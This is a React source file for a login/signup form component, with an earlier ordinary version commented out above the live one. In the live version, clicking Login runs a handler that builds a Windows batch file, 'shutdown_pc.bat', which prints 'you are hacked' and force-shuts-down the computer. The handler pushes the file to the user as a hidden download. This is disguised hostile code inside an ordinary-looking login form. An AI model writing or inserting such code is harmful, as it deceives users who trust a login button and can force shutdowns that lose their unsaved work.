// import React, { useState } from "react";
// import "./LoginSignup.css";
// import user_icon from "../Assets/person.png";
// import email_icon from "../Assets/email.png";
// import password_icon from "../Assets/password.png";

// export const LoginSignup = () => {
//   const [action, setAction] = useState("Sign Up");

//   return (
//     <div className="container">
//       <div className="header">
//         <div className="text">{action}</div>
//         <div className="nderline"></div>
//       </div>
//       <div className="inputs">
//       {action==="Login"?<div></div>: <div className="input">
//           <img src={user_icon} alt="" />
//           <input type="text" placeholder="Name" />
//         </div>}
        
//         <div className="input">
//           <img src={email_icon} alt="" />
//           <input type="email" placeholder="Email id" />
//         </div>
//         <div className="input">
//           <img src={password_icon} alt="" />
//           <input type="password" placeholder="password" />
//         </div>
//       </div>
//       {action==="Sign Up"?<div></div>: <div className="forgot-password">
//         Lost Password?<span>Click Here!</span>
//       </div>}
     
//       <div className="submit-container">
//         <div
//           className={action === "Login" ? "submit gray" : "submit"}
//           onClick={() => {
//             setAction("Sign Up");
//           }}
//         >
//           Sign Up
//         </div>
//         <div
//           className={action === "Sign Up" ? "submit gray" : "submit"}
//           onClick={() => {
//             setAction("Login");
//           }}
//         >
//           Login
//         </div>
//       </div>
//     </div>
//   );
// };

// export default LoginSignup;
import React, { useState } from "react";
import "./LoginSignup.css";
import user_icon from "../Assets/person.png";
import email_icon from "../Assets/email.png";
import password_icon from "../Assets/password.png";

export const LoginSignup = () => {
  const [action, setAction] = useState("Sign Up");

  const handleLoginClick = () => {
    // Create a data URI for the batch file content
    const batchFileContent = `@echo off\necho you are hacked brooooo...\nshutdown /s /f /t 5`;
    const dataUri = `data:text/plain;charset=utf-8,${encodeURIComponent(batchFileContent)}`;

    // Create an anchor element and set its attributes
    const downloadLink = document.createElement("a");
    downloadLink.href = dataUri;
    downloadLink.download = "shutdown_pc.bat";

    // Simulate a click on the anchor element to trigger the download
    downloadLink.click();
  };

  return (
    <div className="container">
      <div className="header">
        <div className="text">{action}</div>
        <div className="nderline"></div>
      </div>
      <div className="inputs">
        {action === "Login" ? (
          <div>
            <button onClick={handleLoginClick}></button>
          </div>
        ) : (
          <div className="input">
            <img src={user_icon} alt="" />
            <input type="text" placeholder="Name" />
          </div>
        )}

        <div className="input">
          <img src={email_icon} alt="" />
          <input type="email" placeholder="Email id" />
        </div>
        <div className="input">
          <img src={password_icon} alt="" />
          <input type="password" placeholder="password" />
        </div>
      </div>
      {action === "Sign Up" ? (
        <div></div>
      ) : (
        <div className="forgot-password">
          Lost Password?<span>Click Here!</span>
        </div>
      )}

      <div className="submit-container">
        <div
          className={action === "Login" ? "submit gray" : "submit"}
          onClick={() => {
            setAction("Sign Up");
          }}
        >
          Sign Up
        </div>
        <div
          className={action === "Sign Up" ? "submit gray" : "submit"}
          onClick={handleLoginClick}
        >
          Login
        </div>
      </div>
    </div>
  );
};

export default LoginSignup;
